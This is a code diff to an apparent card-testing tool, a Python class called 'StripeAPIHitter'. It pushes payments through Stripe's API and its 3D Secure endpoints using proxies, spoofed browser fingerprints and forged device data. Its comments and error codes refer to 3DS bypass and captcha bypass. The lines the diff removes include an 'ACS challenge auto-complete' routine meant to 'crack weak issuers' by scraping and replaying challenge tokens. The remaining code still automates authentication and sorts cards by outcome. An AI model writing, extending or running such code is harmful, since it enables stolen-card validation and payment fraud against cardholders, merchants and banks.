@@ -1418,30 +1418,6 @@ class StripeAPIHitter:
                                         await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=redir_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                     state = "redirected"
                                 elif source:
-                                    # --- 3DS Method URL completion (increases frictionless rate) ---
-                                    # threeDSServerTransID comes from the sdk object, NOT from source
-                                    three_ds_method_url = sdk.get("three_ds_method_url")
-                                    three_ds_server_trans_id = sdk.get("three_ds_server_transaction_id") or sdk.get("three_d_secure_2_source")
-                                    three_ds_comp_ind = "N"  # default: not completed, honest signal
-                                    if three_ds_method_url and three_ds_server_trans_id:
-                                        try:
-                                            import base64 as b64
-                                            # Correct payload: {threeDSServerTransID: <uuid from sdk>}
-                                            method_payload = json.dumps({"threeDSServerTransID": three_ds_server_trans_id}, separators=(",", ":"))
-                                            method_data_b64 = b64.urlsafe_b64encode(method_payload.encode()).decode().rstrip("=")
-                                            method_resp = session.post(three_ds_method_url,
-                                                data={"threeDSMethodData": method_data_b64},
-                                                headers={"Content-Type": "application/x-www-form-urlencoded",
-                                                         "User-Agent": profile["user_agent"],
-                                                         "Origin": "https://js.stripe.com",
-                                                         "Referer": "https://js.stripe.com/"},
-                                                timeout=10)
-                                            if method_resp.status_code in (200, 201, 204):
-                                                three_ds_comp_ind = "Y"  # honestly completed
-                                            await asyncio.sleep(0.4)
-                                        except Exception:
-                                            three_ds_comp_ind = "U"  # unavailable — honest
-
                                     # authenticate is an SDK-facing endpoint — use Android UA (mobile SDK path)
                                     _auth_ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
                                     auth_headers = {
@@ -1463,7 +1439,7 @@ class StripeAPIHitter:
                                         "browserScreenHeight": "873",
                                         "browserScreenWidth": "393",
                                         "browserTZ": "-300",
-                                        "browserUserAgent": _auth_ua
+                                        "browserUserAgent": auth_headers["user-agent"]
                                     }
                                     auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
                                     auth_data = {
@@ -1476,146 +1452,59 @@ class StripeAPIHitter:
                                         "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
                                         "key": pk
                                     }
-                                    _auth_impersonate = "chrome120"
                                     auth_resp_raw = await loop.run_in_executor(None, lambda: cffi_requests.post(
                                         auth_url, headers=auth_headers, data=auth_data,
-                                        proxies=proxies, timeout=30, impersonate=_auth_impersonate))
+                                        proxies=proxies, timeout=30, impersonate="chrome120"))
                                     auth_json = {}
                                     try:
                                         auth_json = auth_resp_raw.json()
                                         state = auth_json.get("state")
                                     except Exception:
-                                        state = None
+                                        state = "3DS Attempt failed"
 
-                                    # --- ACS challenge auto-complete (cracks weak issuers) ---
                                     if state == "challenge_required":
-                                        ares = auth_json.get("ares", {})
-                                        acs_url = ares.get("acsURL")
-                                        creq_val = auth_json.get("creq")
-                                        if acs_url and creq_val:
-                                            try:
-                                                acs_resp = session.post(acs_url,
-                                                    data={"creq": creq_val},
-                                                    headers={
-                                                        "Content-Type": "application/x-www-form-urlencoded",
-                                                        "User-Agent": auth_headers["user-agent"],
-                                                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
-                                                    },
-                                                    timeout=15, allow_redirects=True)
-                                                acs_text = acs_resp.text
-                                                # Extract cres from ACS response (hidden form field)
-                                                cres_match = re.search(r'name=["\']?cres["\']?\s+value=["\']([^"\']+)', acs_text, re.I)
-                                                if not cres_match:
-                                                    cres_match = re.search(r'value=["\']([^"\']+)["\'].*?name=["\']?cres', acs_text, re.I)
-                                                if not cres_match:
-                                                    cres_match = re.search(r'["\']cres["\']\s*:\s*["\']([^"\']+)', acs_text, re.I)
-                                                if cres_match:
-                                                    cres_val = cres_match.group(1)
-                                                    # /v1/3ds2/challenge is Stripe infra — use cffi for Chrome TLS
-                                                    ch_resp_raw = await loop.run_in_executor(None, lambda: cffi_requests.post(
-                                                        "https://api.stripe.com/v1/3ds2/challenge",
-                                                        data={"source": source, "cres": cres_val, "key": pk},
-                                                        headers=auth_headers, proxies=proxies,
-                                                        timeout=15, impersonate="chrome120"))
-                                                    try:
-                                                        ch_data = ch_resp_raw.json()
-                                                        if ch_data.get("state") in ["succeeded", "complete"]:
-                                                            state = ch_data.get("state")
-                                                    except Exception:
-                                                        pass
-                                            except Exception:
-                                                pass
+                                        result['decline_code'] = 'challenge_required'
+                                        result['error'] = 'challenge_required'
+                                        return result
 
-                            # --- ALWAYS POLL with retry loop — frictionless auth can lag 2-5s on issuer side ---
-                            is_setup = is_setup_intent or (isinstance(pi, str) and 'seti' in pi)
-                            intent_endpoint = "setup_intents" if is_setup else "payment_intents"
-                            poll_url = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
-                            poll_headers = {
-                                "accept": "application/json",
-                                "origin": "https://js.stripe.com",
-                                "referer": "https://js.stripe.com/",
-                                "user-agent": profile["user_agent"]
-                            }
-                            poll_json = {}
-                            status_2 = None
-                            for _poll_attempt in range(6):  # up to ~8s total
-                                await asyncio.sleep(0.5 + _poll_attempt * 0.8)
-                                try:
-                                    # Use cffi for Chrome TLS on Stripe API poll
+                                    is_setup = is_setup_intent or (isinstance(pi, str) and 'seti' in pi)
+                                    intent_endpoint = "setup_intents" if is_setup else "payment_intents"
+                                    poll_url = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
+                                    poll_headers = {
+                                        "accept": "application/json",
+                                        "origin": "https://js.stripe.com",
+                                        "referer": "https://js.stripe.com/"
+                                    }
                                     poll_resp_raw = await loop.run_in_executor(None, lambda: cffi_requests.get(
                                         poll_url, headers=poll_headers, proxies=proxies,
-                                        timeout=15, impersonate=profile["impersonate"]))
+                                        timeout=30, impersonate=profile["impersonate"]))
                                     poll_json = poll_resp_raw.json()
                                     status_2 = poll_json.get('status')
-                                    if status_2 not in ('requires_action', 'requires_source_action', 'processing', None):
-                                        break  # terminal state reached
-                                    if status_2 in ('requires_action', 'requires_source_action'):
-                                        # If next_action changed to redirect_to_url, bail early for redirect handling
-                                        na = poll_json.get('next_action') or {}
-                                        if na.get('type') == 'redirect_to_url':
-                                            break
-                                except Exception:
-                                    continue
-
-                            if status_2 in ['succeeded', 'requires_capture', 'complete']:
-                                result['success'] = True
-                                receipt_url = find_receipt_url(poll_json)
-                                if not receipt_url and pi and client_secret:
-                                    receipt_url = await self.fetch_receipt_url(pi, client_secret, headers, proxies, profile)
-                                if receipt_url:
-                                    result['receipt_url'] = receipt_url
-                                return result
-
-                            # Handle redirect_to_url from poll (covers both initial and post-auth redirects)
-                            next_act_2 = poll_json.get('next_action') or {}
-                            if status_2 in ['requires_action', 'requires_source_action'] and next_act_2.get('type') == 'redirect_to_url':
-                                redir_url = next_act_2.get('redirect_to_url', {}).get('url')
-                                ret_url = next_act_2.get('redirect_to_url', {}).get('return_url')
-                                if redir_url:
-                                    redir_headers = {
-                                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-                                        "user-agent": profile["user_agent"]
-                                    }
-                                    await loop.run_in_executor(None, lambda u=redir_url: cffi_requests.get(u, headers=redir_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
-                                    await asyncio.sleep(0.5)
-                                    poll_url_3 = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}?key={pk}&client_secret={client_secret}&is_stripe_sdk=false"
-                                    poll_res_3 = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url_3, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
-                                    poll_json_3 = poll_res_3.json()
-                                    if poll_json_3.get('status') in ['succeeded', 'requires_capture', 'complete']:
+                                    
+                                    if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                         result['success'] = True
-                                        result['final_url'] = ret_url or redir_url
-                                        receipt_url = find_receipt_url(poll_json_3)
+                                        receipt_url = find_receipt_url(poll_json)
                                         if not receipt_url and pi and client_secret:
                                             receipt_url = await self.fetch_receipt_url(pi, client_secret, headers, proxies, profile)
                                         if receipt_url:
                                             result['receipt_url'] = receipt_url
                                         return result
-                                    result['decline_code'] = '3d_secure_required_hard'
-                                    result['error'] = f"3d_secure_required_hard: redir_url={redir_url}"
-                                    result['final_url'] = ret_url or redir_url
-                                    return result
 
-                            err = poll_json.get('last_payment_error') or poll_json.get('error') or {}
-                            if isinstance(err, dict) and err.get('message'):
-                                result['decline_code'] = err.get('decline_code', err.get('code', status_2))
-                                result['error'] = err.get('message', 'Unknown error')
-                            elif state == "challenge_required":
-                                result['decline_code'] = 'challenge_required'
-                                result['error'] = 'challenge_required'
-                            elif captcha_triggered:
-                                result['decline_code'] = 'stripe_captcha_bypass_failed'
-                                # Dump full raw response so user can inspect exact rqdata payload
-                                try:
-                                    _raw_dump = json.dumps(confirm_json, indent=None, default=str)
-                                except Exception:
-                                    _raw_dump = str(confirm_json)
-                                result['error'] = f'rqdata_captcha | raw: {_raw_dump}'
-                            else:
-                                result['decline_code'] = status_2 or '3ds_unknown'
-                                next_act = poll_json.get('next_action') or {}
-                                action_type = next_act.get('type', 'unknown')
-                                result['error'] = f"3ds_challenge_unresolved: action_type={action_type}"
-                            return result
+                                    err = poll_json.get('last_payment_error') or poll_json.get('error') or {}
+                                    if isinstance(err, dict) and err.get('message'):
+                                        result['decline_code'] = err.get('decline_code', err.get('code', status_2))
+                                        result['error'] = err.get('message', 'Unknown error')
+                                    elif captcha_triggered:
+                                        result['decline_code'] = 'stripe_captcha_bypass_failed'
+                                        try:
+                                            _raw_dump = json.dumps(confirm_json, indent=None, default=str)
+                                        except Exception:
+                                            _raw_dump = str(confirm_json)
+                                        result['error'] = f'rqdata_captcha | raw: {_raw_dump}'
+                                    else:
+                                        result['decline_code'] = status_2 or '3ds_unknown'
+                                        result['error'] = f"3ds_challenge_unresolved"
+                                    return result
                         except Exception as ex:
                             print(f"DEBUG: 3DS bypass failed: {ex}")
                             result['decline_code'] = f'3d_secure_exception_{str(ex)[:30]}'
